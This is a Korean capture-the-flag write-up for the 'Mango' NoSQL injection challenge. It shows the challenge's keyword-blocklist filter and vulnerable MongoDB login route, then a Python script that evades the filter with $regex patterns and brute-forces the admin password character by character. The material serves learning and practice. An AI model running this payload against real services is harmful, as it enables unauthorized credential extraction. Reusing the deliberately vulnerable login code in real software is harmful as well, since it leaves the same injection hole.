## Concept
NoSQL Injection은 관계형 데이터베이스(RDBMS)가 아닌 MongoDB, Redis, Cassandra 같은 *NoSQL 데이터베이스*를 대상으로 하는 취약점으로, SQLi같이 사용자의 입력값이 조작되어 **DB쿼리의 로직을 왜곡**시키는 공격이다
## 서비스 분석
### 문제
Mango

```js
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```
{: file="filter.js"}
filter함수는 data를 소문자로 변경한 후에 BAN리스트에 있는 `admin`, `dh`, `admi` 이 세 단어가 포함되면 flag를 true로 리턴한다.
```js
app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});
```
{: file="login.js"}
`/login`엔드포인트에서 위에서 본 `filter()`함수를 이용해서 사용자의 요청을 필터링한다. 가령 `/login?uid=admin`같은 요청을 보내면 *filter*를 반환한다.


uid가 adm로 시작하고 upw가 guest가 아닌 계정으로 로그인 요청을 보내고 admin계정으로 로그인에 성공하는 NoSQLi페이로드가 작동했다. 플래그는 admin계정의 비밀번호라고 하였으니 브루트포싱해서 admin계정으로 로그인에 성공하는 비밀번호를 찾아내면 된다.

### 익스플로잇
요청 쿼리스트링은 `uid[$regex]=ad.in&upw[$regex]=^{}` 이런 형식으로 {}에 무차별대입해서 맞는 패스워드를 찾는 브루트포싱 코드를 작성후 실행하여 플래그를 획득해보자
```python
import string
import requests

URL = "targetURL"

CHAR_POOL = string.ascii_letters + string.digits

def Bruteforce():
    known_password = "..{"
    print("[+] 플래그 탐색을 시작합니다...")

    while True:
        found_next_char = False
        
        for char in CHAR_POOL:
            test_regex = f"^{known_password}{char}"
            
            payload = {
                "uid[$regex]": "ad.in",
                "upw[$regex]": test_regex
            }
            
            try:
                response = requests.get(URL, params=payload, timeout=3)
                #위 페이로드를 보내서 응답이 admin이면 찾은 패스워드를 기존pw에 추가하여 계속 누적해서 테스트
                if response.text == "admin":
                    known_password += char
                    
                    display_format = known_password.replace("..{", "DH{")
                    print(f"[!] 글자 발견! 현재 플래그: {display_format}")
                    
                    found_next_char = True
                    break
                    
            except requests.RequestException as e:
                print(f"[-] 네트워크 오류 발생: {e}")
                return

        # 모든 문자 풀을 대입 -> 다음글자X -> 이미 다 찾음
        if not found_next_char:
            final_flag = known_password.replace("..{", "DH{") + "}"
            print(f"\n[★] 최종 플래그 획득 완료: {final_flag}")
            break

if __name__ == "__main__":
    Bruteforce()
```
